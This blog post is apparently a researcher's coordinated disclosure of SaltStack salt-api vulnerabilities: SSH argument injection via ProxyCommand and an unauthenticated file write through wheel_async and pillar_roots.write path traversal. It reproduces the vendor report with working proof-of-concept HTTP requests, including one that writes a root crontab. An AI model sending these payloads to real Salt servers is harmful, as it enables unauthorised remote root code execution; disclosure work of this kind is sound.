---
title:  "SaltStack API vulnerabilities"
layout: post
date:   2021-03-03
permalink: posts/saltapi-vulns
---


**Details on CVE-2021-3197, CVE-2021-25281 and CVE-2021-25282**

In November 2020 after seeing a pre-auth RCE (CVE-2020-16846, CVE-2020-25592) [get dropped](https://www.thezdi.com/blog/2020/11/24/detailing-saltstack-salt-command-injection-vulnerabilities) for Salt API, I wanted to find my own. 

[Looking at the patch for CVE-2020-16846](https://gitlab.com/saltstack/open/salt-patches/-/blob/master/patches/2020/09/02/3002.patch#L32) you can see they have added a `_split_cmd` function that splits the arguments into a list, and removed the use of the `shell=True` option. While this was effective at preventing command injection through shell metacharacters, it still allowed an attacker to specify arbitrary arguments to the ssh command. By adding an SSH option after any of the POSTed ssh parameters - e.g.  `ssh_port=2222%09-o%20ProxyCommand="touch%20/tmp/rce"`, the argument injection could be turned into arbitrary command execution. The %09 is a tab character is used for seperation, however a %20 works just as well. This ended up as CVE-2021-3197. The patch release adds [a case sensitive check for "ProxyCommand"](https://github.com/saltstack/salt/blob/08fe46365f92583ea875f9e4a8b2cb5305b34e4b/salt/client/ssh/client.py#L72) in the arguments passed to SSH.

Unfortunately the November fix for CVE-2020-25592 made this call post authentication only, so I had a look through the other "clients" that can be passed to the /run endpoint. 
It turned out that `wheel_async` can still be used pre-authentication (assigned CVE-2021-25281). This gives the ability to run arbitrary wheel modules. After a quick look through these, I found the `pillar_roots.write` function could be used to write arbitrary files on the host through a path traversal (assigned CVE-2021-25282).  Interestingly, this is very similar to the function [file_roots.write](https://github.com/saltstack/salt/blob/08fe46365f92583ea875f9e4a8b2cb5305b34e4b/salt/wheel/file_roots.py#L98), which (I later realised) was fixed in `CVE-2020-11652`. The pillar_roots variant remained unfixed until I reported it.

Since the default Ubuntu install of Salt (in my test env) ran as root, the easiest way to turn this to code execution was to write a crontab. I promptly dusted my hands and sent the vulnerability report off to Salt. However after reviewing the patch notes I discovered there was an even better way to exploit it - CVE-2021-25283 discovered by Tencent Yunding Security Lab. More details on their method are [here](https://cloud.tencent.com/developer/article/1794370). Very nice!

## Timeline
It took a few hours total to find these after looking at patches for the last set of vulnerabilities. I reported them to Salt on 27/11/2020. Salt aimed for a Feb 4 release, however this slipped and they ended up releasing the patches and an [announcement](https://saltproject.io/security_announcements/active-saltstack-cve-release-2021-feb-25/) on the 25th of February, roughly 90 days after I reported the vulnerabilities.


## Details:

Here's a copy of the report I sent to Salt.

```
Authenticated argument injection in netapi salt-api SSH client

The fix for CVE-2020-16846 escapes the input to the netapi ssh client. However an attacker can still inject arguments using the %09 (tab) character, which are passed through to SSH invocations. For example, the following request will create the "/tmp/rce" file on the salt master. It does require valid credentials, which I have provided in the request.


POST /run HTTP/1.1
Host: 192.168.200.129
Content-Type: application/x-www-form-urlencoded
Content-Length: 165

client=ssh&roster=&tgt=*&fun=test.ping&ssh_user=test123&ssh_port=2222%09-o%20ProxyCommand="touch%20/tmp/rce"&ssh_priv=as`id`df&eauth=pam&username=user&password=user

This ends up executing the command :

ssh 192.168.200.131 -o KbdInteractiveAuthentication=no -o PasswordAuthentication=yes -o GSSAPIAuthentication=no -o ConnectTimeout=65 -o Port=2222 -o ProxyCommand=touch /tmp/rce -o IdentityFile=asdf -o User=user /bin/sh  << 'EOF' set -e set -u

which executes the command through the ProxyCommand argument to SSH. Other parameters passed through are also vulnerable such as ssh_priv and ssh_user, as long as they are not defined already in the roster file. Exploiting this also requires at least one roster host to be defined.




==================================

Unauthenticated arbitrary file write in salt-api

The wheel_async client does not check for authentication when it is called. This allows an arbitrary file write in conjunction with a path traversal in the pillar_roots.write function. As the salt-master runs as root by default it can be used to write a new crontab file, which will execute automatically on most linux systems. 

POC:
--

POST /run HTTP/1.1
Host: 192.168.200.129
Content-Length: 187
Content-Type: application/json;charset=UTF-8

{"token":"1","client":"wheel_async","fun":"pillar_roots.write",
"arg":[],
"kwarg": {"data":"* * * * * root /bin/bash -c \"touch /tmp/rce4\"\n","path":"../../../../etc/cron.d/saltrce4"}}


--
After a minute, check in /tmp/ for the rce4 file, which should have been created by the crontab. There are probably other ways to exploit this file write to obtain code execution.


```
